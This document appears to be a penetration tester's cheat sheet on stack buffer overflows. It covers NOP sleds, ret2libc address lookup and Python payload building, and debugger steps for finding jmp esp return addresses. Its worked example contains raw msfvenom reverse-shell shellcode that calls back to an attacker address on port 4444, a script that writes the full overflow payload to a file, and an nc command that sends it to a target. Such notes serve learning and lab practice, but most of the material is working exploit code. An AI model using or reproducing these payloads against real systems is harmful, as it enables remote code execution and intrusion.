* Check if you can write executable code in the stack with peda: ``checksec``. 
* Alternatively you have to do it manually or use a script: https://github.com/slimm609/checksec.sh/blob/master/README.md 
* If NX is enabled writing shellcode into buffer will not execute

# Concept
```
     STACK

________________
|   Function   |
----------------
|     Data     |
----------------
|Return Address|
----------------
|Base Pointers |
----------------
|      ^       |
|      |       |
|              |
|    Buffer    |
|              |
|              |
________________
```
* Try to exceed buffer and overwrite base pointers and return address
* Craft buffer according to the following concept 

```bash
python -c 'print "\x90" * 470 + "<shellcode>" + "<memory address in middle of NOPs>" 
```
* \x90 is a NOP and works like a sled since it gets skipped
* therefore run the binary and check $esp for NOP's
* choose address in middle and paste it as 'memory address in middle of NOPs'
* in the example the offset is 500
* $eip gets overwritten with memory address in middle of NOP's
* NOP's get hit 
* instructions follow until shellcode is hit and executes

# ret2libc
* you need the libc address as kind of a 'base'
* afterwards the stack frame dictates the order the function call and parameters are written
* see this [link](https://newbedev.com/why-must-a-ret2libc-attack-follow-the-order-system-exit-command) (explains it much better)
```
function_address
return_address
parameters
```
* so either try to provide some junk for parameters so the function may return to your payload
* or provide actual exit address and payload as parameter for system()

1. find the libc address 
```bash
ldd <binary>
```
2. find the system() address
```bash
locate libc.so.6
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
3. find the exit() address
```bash
locate libc.so.6
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
```
4. find /bin/sh in libc
```bash
strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
5. create simple python script to print payload
```python
import struct

junk = "A" * 52

libc_addr = 0xf7d79000
sh_addr = struct.pack('<I', libc_addr + 0x0015ba0b)
system_addr = struct.pack('<I', libc_addr + 0x0003ada0)
exit_addr = struct.pack('<I', libc_addr + 0x0002e9d0)

payload = junk + system_addr + exit_addr + sh_addr

print payload
```

# Example
```
# First try to get exact overflow with either msf-pattern_create or by manual/scripted fuzzing
# Example: Offset at 1252
# Overwrite EIP with 'B's and check with debugger if a register points into memory that we can control
#
# Example: 
# < 1252 >
# AAA...AABBBBCCCCCCCCCCCCCCCCCC
#         \  /\                 /
#          \/  \               /
#         EIP  ESP points to this
#
# Check for badchars, see https://github.com/cytopia/badchars
# Simply paste 'A's and the badchars, follow the dump at crash and check what characters are not allowed '\x00'
# Example badchars: \x0a\x1a\x1b\xae\xce\x69
#
# Generate shellcode
# msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=192.168.119.232 LPORT=4444 -f python -b "\x0a\x1a\x1b\xae\xce\x69"
# => 351 bytes
buf =  b"" 
buf += b"\xda\xcb\xd9\x74\x24\xf4\xbe\xec\xf0\x80\xa0\x5b\x33"
buf += b"\xc9\xb1\x52\x83\xeb\xfc\x31\x73\x13\x03\x9f\xe3\x62"
buf += b"\x55\xa3\xec\xe1\x96\x5b\xed\x85\x1f\xbe\xdc\x85\x44"
buf += b"\xcb\x4f\x36\x0e\x99\x63\xbd\x42\x09\xf7\xb3\x4a\x3e"
buf += b"\xb0\x7e\xad\x71\x41\xd2\x8d\x10\xc1\x29\xc2\xf2\xf8"
buf += b"\xe1\x17\xf3\x3d\x1f\xd5\xa1\x96\x6b\x48\x55\x92\x26"
buf += b"\x51\xde\xe8\xa7\xd1\x03\xb8\xc6\xf0\x92\xb2\x90\xd2"
buf += b"\x15\x16\xa9\x5a\x0d\x7b\x94\x15\xa6\x4f\x62\xa4\x6e"
buf += b"\x9e\x8b\x0b\x4f\x2e\x7e\x55\x88\x89\x61\x20\xe0\xe9"
buf += b"\x1c\x33\x37\x93\xfa\xb6\xa3\x33\x88\x61\x0f\xc5\x5d"
buf += b"\xf7\xc4\xc9\x2a\x73\x82\xcd\xad\x50\xb9\xea\x26\x57"
buf += b"\x6d\x7b\x7c\x7c\xa9\x27\x26\x1d\xe8\x8d\x89\x22\xea"
buf += b"\x6d\x75\x87\x61\x83\x62\xba\x28\xcc\x47\xf7\xd2\x0c"
buf += b"\xc0\x80\xa1\x3e\x4f\x3b\x2d\x73\x18\xe5\xaa\x74\x33"
buf += b"\x51\x24\x8b\xbc\xa2\x6d\x48\xe8\xf2\x05\x79\x91\x98"
buf += b"\xd5\x86\x44\x0e\x85\x28\x37\xef\x75\x89\xe7\x87\x9f"
buf += b"\x06\xd7\xb8\xa0\xcc\x70\x52\x5b\x87\xbe\x0b\x14\xbf"
buf += b"\x57\x4e\xda\x2e\xf4\xc7\x3c\x3a\x14\x8e\x97\xd3\x8d"
buf += b"\x8b\x63\x45\x51\x06\x0e\x45\xd9\xa5\xef\x08\x2a\xc3"
buf += b"\xe3\xfd\xda\x9e\x59\xab\xe5\x34\xf5\x37\x77\xd3\x05"
buf += b"\x31\x64\x4c\x52\x16\x5a\x85\x36\x8a\xc5\x3f\x24\x57"
buf += b"\x93\x78\xec\x8c\x60\x86\xed\x41\xdc\xac\xfd\x9f\xdd"
buf += b"\xe8\xa9\x4f\x88\xa6\x07\x36\x62\x09\xf1\xe0\xd9\xc3"
buf += b"\x95\x75\x12\xd4\xe3\x79\x7f\xa2\x0b\xcb\xd6\xf3\x34"
buf += b"\xe4\xbe\xf3\x4d\x18\x5f\xfb\x84\x98\x6f\xb6\x84\x89"
buf += b"\xe7\x1f\x5d\x88\x65\xa0\x88\xcf\x93\x23\x38\xb0\x67"
buf += b"\x3b\x49\xb5\x2c\xfb\xa2\xc7\x3d\x6e\xc4\x74\x3d\xbb"
buffer = b"A"*1252
eip = b"\xb2\x11\x80\x14"
shellcode = buf 
nops = b"\x90"*12
buffer2 = b"B"*1000

payload = buffer + eip + nops + shellcode + buffer2

f = open('payload', 'wb')
f.write(payload)
f.close()

# cat payload | nc 10.10.10.10 5000
```
# EDB Debugger (Linux)
Install
```
sudo apt install edb-debugger
```
## Search a return address
1. See Plugins > OpcodeSearcher
2. Search ESP -> EIP and select your program

# Immunity Debugger (Windows)
## Finding a Return Address
```
» msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp

```
Use the mona plugin and run
```
!mona modules # get all modules
!mona find -s "\xff\xe4" -m "program.dll"
```
Check if the address contain any bad chars since it will most likely not work otherwise
